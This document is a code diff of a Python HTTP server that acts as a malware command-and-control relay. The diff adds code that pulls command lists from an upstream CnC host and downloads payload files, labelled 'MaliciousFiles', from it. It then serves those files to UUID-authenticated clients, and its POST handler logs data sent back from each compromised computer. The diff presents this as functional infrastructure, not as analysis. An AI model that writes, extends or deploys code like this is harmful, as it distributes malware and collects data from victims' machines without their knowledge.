@@ -3,6 +3,10 @@ import time
 import urllib.request
 import os
 import json
+import requests
+
+#CnC Authentication
+HEADERS = {'UUID':'5a968c26-b565-4b65-8445-9e87780cb8f9-02'}
 
 hostName = "A" #ip
 hostPort = 0 #443
@@ -10,31 +14,48 @@ UUID = ''
 MaliciousPath = ''
 Commands=[]
 Configuration = ""
+CnCAddress = ''
+CnCPort = 0
 
 scriptDir = os.getcwd()
 
 def ConfigurationServer():
     with open('configuration.json') as f:
         confFileJson = json.load(f)
+
         global hostName
         global hostPort
         global UUID
         global MaliciousPath
-        global Commands
-        global Configuration
+        global CnCAddress
+        global CnCPort
 
         hostName = confFileJson['Server']
         hostPort = confFileJson['Port']
         UUID = confFileJson['UUID']
+        CnCAddress = confFileJson['CnCAddress']
+        CnCPort = confFileJson['CnCPort']
         MaliciousPath = confFileJson['MaliciousPath']
 
-        f = open('commands.txt', 'r')
-        Commands = f.read().splitlines()
-        f.close()
-        #Commands = confFileJson['Commands']
+        #Commands = json.loads(requests.get('http://'+CnCAddress+':'+str(CnCPort)+'/GetCommands' , headers=HEADERS).text)['Commands']
+        #Configuration = {'Server': hostName, 'Commands':Commands,'MaliciousPath': MaliciousPath}
 
-        #This is the configuration for the client side
-        Configuration = {'Server': hostName, 'Commands':Commands,'MaliciousPath': MaliciousPath}
+def DownloadFile(url):
+    #file = url.split('/')[-1]+'.exe'
+    #r = requests.Session()
+    # NOTE the stream=True parameter
+    try:
+        r = requests.get(url, stream=True, headers=HEADERS)
+        file = r.headers['Filename']
+        with open(os.path.join(scriptDir,"MaliciousFiles",file), 'wb') as f:
+            for chunk in r.iter_content(chunk_size=1024):
+                if chunk: # filter out keep-alive new chunks
+                    f.write(chunk)
+                        #f.flush() commented by recommendation from J.F.Sebastian
+        return file
+    except:
+        None
+    return None
 
 class MyServer(BaseHTTPRequestHandler):
     #GET Requests
@@ -43,6 +64,12 @@ class MyServer(BaseHTTPRequestHandler):
         if (self.headers.get('UUID') == UUID):
             #Client asked for configuration
             if self.path.endswith("/Configuration"):
+                global Commands
+                #This is the configuration for the client side
+                global Configuration
+
+                Commands = json.loads(requests.get('http://'+CnCAddress+':'+str(CnCPort)+'/GetCommands' , headers=HEADERS).text)['Commands']
+                Configuration = {'Server': hostName, 'Commands':Commands,'MaliciousPath': MaliciousPath}
                 self.send_response(200)
                 self.send_header('Content-Type', 'application/json')
                 self.end_headers()
@@ -51,13 +78,17 @@ class MyServer(BaseHTTPRequestHandler):
                 return
 
             if self.path.endswith(MaliciousPath):
+                MaliciousFile = DownloadFile('http://'+CnCAddress+':'+str(CnCPort)+'/GetFile')
+
                 self.send_response(200)
                 self.send_header('Content-type', 'application/html')
-                self.send_header('FileName', 'calc.exe')
+                self.send_header('FileName', MaliciousFile)
                 self.end_headers()
-                with open(os.path.join(scriptDir+ "\\calc.exe"), 'rb') as file:
+                with open(os.path.join(scriptDir,"MaliciousFiles",MaliciousFile), 'rb') as file:
                     self.wfile.write(file.read())
-                #self.wfile.write(open().read(), 'rb'))
+                    file.close()
+                    #Remove comment to delete files on server side
+                    #os.remove(os.path.join(scriptDir,"MaliciousFiles",MaliciousFile))
                 return
 
     #POST Requests
@@ -72,7 +103,7 @@ class MyServer(BaseHTTPRequestHandler):
                 self.end_headers()
                 data = json.loads(self.data_string)
                 print('New Data recieved from '+data['computer'])
-                with open(os.path.join(scriptDir+ "\CommandsData\\"+data['computer']+".dat"), "ab+") as outfile:
+                with open(os.path.join(scriptDir, "CommandsData",data['computer']+".dat"), "ab+") as outfile:
                     outfile.write((data['computer']+','+data['type']+','+data['data']).encode())
                 self.wfile.write(("Done").encode())
                 return
